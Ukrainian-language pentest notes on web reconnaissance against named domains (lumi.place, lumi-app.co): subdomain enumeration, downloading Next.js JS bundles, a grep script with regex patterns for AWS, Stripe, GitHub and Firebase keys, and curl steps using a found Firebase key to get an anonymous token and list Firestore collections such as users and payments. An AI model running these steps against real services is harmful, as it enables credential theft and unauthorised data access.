# Web Recon & JS Secret Hunting — Конспект

## Контекст
Black-box пентест інфраструктури lumi.place / lumi-app.co. Ціль — знайти вразливості через публічно доступні ресурси.

---

## 1. Subdomain Enumeration

### Інструменти
- **crt.sh** — Certificate Transparency логи. Коли компанія отримує SSL сертифікат — він публічно логується. Запит: `https://crt.sh/?q=%.lumi.place`
- **subfinder** — пасивний збір субдоменів з 50+ джерел включно з crt.sh

```bash
subfinder -d lumi.place -o subs.txt
```

### HTTP Fingerprinting
```bash
curl -sI https://subdomain.com | grep -E "HTTP|server|x-powered-by|location"
```
Заголовок `Server:` одразу показує стек: `AmazonS3`, `Express`, `nginx` тощо.

---

## 2. JS Bundle Analysis

### Чому це працює
Будь-який React/Vue/Angular/Next.js додаток компілює весь код у публічні JS файли. Браузер їх завантажує — значить вони доступні всім. Розробники часто забувають що секрети потрапляють в білд.

### Де шукати JS файли
- Next.js: `/_next/static/chunks/`
- Create React App: `/static/js/`
- Vite: `/assets/`

### Інструмент — katana
```bash
go install github.com/projectdiscovery/katana/cmd/katana@latest

katana -u https://target.com -jc -o js_urls.txt
```

### Завантаження chunks (правильний спосіб)

**Проблема:** katana може повертати дублі з вкладеними шляхами:
```
/_next/static/chunks/b056a0efc38c07cd.js           ← правильний
/_next/static/chunks/static/chunks/b056a0efc38c07cd.js  ← битий (повертає HTML)
```

**Фікс** — фільтрувати тільки прямі файли без вкладених папок:
```bash
mkdir ~/chunks
grep "target.com/_next/static/chunks/[^/]*\.js" js_urls.txt | sort -u | while read url; do
    filename=$(basename "$url")
    echo "Downloading: $filename"
    curl -s "$url" -o ~/chunks/"$filename"
done
```

`[^/]*` — після `chunks/` немає більше слешів.

### Перевірка що файл завантажився правильно
```bash
wc -c ~/chunks/filename.js    # реальний JS > 10KB зазвичай
head -c 100 ~/chunks/filename.js  # не повинно починатись з <!DOCTYPE html>
```

---

## 3. Secret Hunting

### Скрипт `find_key.sh`
```bash
#!/bin/bash

CHUNKS_DIR=$1

echo "=== Firebase ==="
grep -rhoP 'AIza[A-Za-z0-9_\-]{35}' "$CHUNKS_DIR"

echo "=== AWS Access Key ==="
grep -rhoP 'AKIA[A-Z0-9]{16}' "$CHUNKS_DIR"

echo "=== AWS Secret Key ==="
grep -rhoP '(?i)aws_secret[^"]*"[A-Za-z0-9/+=]{40}"' "$CHUNKS_DIR"

echo "=== Stripe Live ==="
grep -rhoP 'sk_live_[A-Za-z0-9]{24}' "$CHUNKS_DIR"

echo "=== Stripe Test ==="
grep -rhoP 'sk_test_[A-Za-z0-9]{24}' "$CHUNKS_DIR"

echo "=== GitHub Token ==="
grep -rhoP 'ghp_[A-Za-z0-9]{36}' "$CHUNKS_DIR"

echo "=== Twilio ==="
grep -rhoP 'SK[a-z0-9]{32}' "$CHUNKS_DIR"

echo "=== SendGrid ==="
grep -rhoP 'SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}' "$CHUNKS_DIR"

echo "=== Mailgun ==="
grep -rhoP 'key-[a-z0-9]{32}' "$CHUNKS_DIR"

echo "=== Mapbox ==="
grep -rhoP 'pk\.eyJ1[A-Za-z0-9_\-]+' "$CHUNKS_DIR"
```

```bash
chmod +x find_key.sh
./find_key.sh ~/chunks/
```

### Патерни ключів
| Сервіс | Патерн | Пояснення |
|---|---|---|
| Firebase | `AIza[A-Za-z0-9_-]{35}` | Google завжди починає з AIza |
| AWS | `AKIA[A-Z0-9]{16}` | Amazon Key ID завжди з AKIA |
| Stripe | `sk_live_...` | live = продакшн ключ |
| GitHub | `ghp_...` | GitHub Personal Access Token |

### Grep флаги
- `-r` — рекурсивно по всіх файлах в папці
- `-h` — не показувати ім'я файлу
- `-o` — тільки сам match, не весь рядок
- `-P` — Perl regex (підтримує `{35}` синтаксис)

---

## 4. Firebase Key Verification

### Крок 1 — перевірити ключ і конфігурацію проєкту
```bash
KEY="AIzaSy..."
PROJECT="project-id"

curl "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getProjectConfig?key=$KEY"
```
Повертає `authorizedDomains` — де офіційно використовується ключ.

### Крок 2 — отримати анонімний токен
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$KEY" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken":true}'
```
Якщо повертає `idToken` — анонімна авторизація активна. Це вже вразливість.
Якщо `OPERATION_NOT_ALLOWED` — анонімний логін відключений.

### Крок 3 — перевірити доступ до Firestore з токеном
```bash
TOKEN="<idToken з кроку 2>"

# Спробувати кореневий список колекцій
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents" \
  -H "Authorization: Bearer $TOKEN"

# Перебрати типові колекції
for col in users profiles sessions orders payments subscriptions; do
    echo "--- $col ---"
    curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/$col" \
      -H "Authorization: Bearer $TOKEN" | head -c 300
done
```

### Крок 4 — перевірити Storage і Realtime DB
```bash
curl -s "https://firebasestorage.googleapis.com/v0/b/$PROJECT.firebasestorage.app/o" \
  -H "Authorization: Bearer $TOKEN"

curl -s "https://$PROJECT-default-rtdb.firebaseio.com/.json?auth=$TOKEN"
```

### Що означають відповіді
| Відповідь | Що це означає |
|---|---|
| `idToken` у відповіді на signUp | Анонімний логін активний — вразливість |
| `OPERATION_NOT_ALLOWED` | Анонімний логін відключений |
| JSON з документами Firestore | Security Rules відкриті — критично |
| `403 PERMISSION_DENIED` | Security Rules захищені |
| `404 Not Found` | Сервіс не активований |

---

## 5. Повний Workflow

```bash
# 1. Субдомени
subfinder -d target.com -o subs.txt

# 2. Перевірити живі хости
cat subs.txt | httpx -status-code -title -tech-detect

# 3. Зібрати JS URLs
katana -u https://subdomain.target.com -jc -o js_urls.txt

# 4. Завантажити chunks (тільки прямі файли)
mkdir chunks
grep "subdomain.target.com/_next/static/chunks/[^/]*\.js" js_urls.txt | sort -u | while read url; do
    filename=$(basename "$url")
    echo "Downloading: $filename"
    curl -s "$url" -o chunks/"$filename"
done

# 5. Сканувати
./find_key.sh chunks/
```

---

## 6. Інструменти

| Інструмент | Встановлення | Призначення |
|---|---|---|
| subfinder | `apt install subfinder` | Subdomain enumeration |
| httpx | `go install ...projectdiscovery/httpx` | HTTP fingerprinting |
| katana | `go install ...projectdiscovery/katana` | JS crawler |
| trufflehog | `apt install trufflehog` | Автоматичний secret scan |
| nuclei | `apt install nuclei` | Vulnerability templates |

### Про pipx
Kali блокує `pip install` system-wide (PEP 668). Для Python CLI інструментів використовувати `pipx`:
```bash
sudo apt install pipx -y
pipx install tool-name
```

### Про Go інструменти на Kali
Встановлювати під конкретним юзером (не root):
```bash
sudo apt install golang-go -y
echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.zshrc
source ~/.zshrc
go install github.com/projectdiscovery/katana/cmd/katana@latest
```

---

## 7. False Positives

trufflehog може спрацювати на base64 рядки в коді. Перевіряти контекст:
```bash
grep -o '.\{100\}ЗНАХІДКА.\{100\}' ~/chunks/file.js
```

**Реальний ключ:** `apiKey: "AIzaSy..."` — з контекстом присвоєння
**False positive:** `...xYBOxY+AIzaSy.../rSyHH...` — всередині crypto/base64 блоку

---

## 8. Важливі нюанси

- **process.env.AWS_ACCESS_KEY_ID** в коді — це НЕ витік. Код читає з env змінної (серверна сторона)
- **"AKIA..."** як літеральний рядок — це витік
- Staging середовища (`try.`, `dev.`, `stage.`) часто менш захищені — перевіряти в першу чергу
- `noindex, nofollow` в meta тегах — ознака staging/internal середовища
- `access-control-allow-origin: *` — CORS відкритий для всіх, потенційна проблема
